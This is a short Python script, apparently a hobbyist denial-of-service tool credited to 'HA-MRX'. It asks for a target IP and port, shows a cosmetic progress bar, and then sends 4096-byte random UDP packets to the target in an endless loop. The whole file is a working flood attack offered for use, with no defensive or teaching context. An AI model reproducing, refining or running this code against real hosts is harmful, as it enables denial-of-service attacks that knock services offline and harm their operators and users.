import sys
import os
import time
import socket
import random
from datetime import datetime

# Get current time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(4096)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("Author   : HA-MRX")
print("github   : https://github.com/Ha3MrX")
print()
ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    print("Sent %s packet to %s through port:%s" % (sent, ip, port))
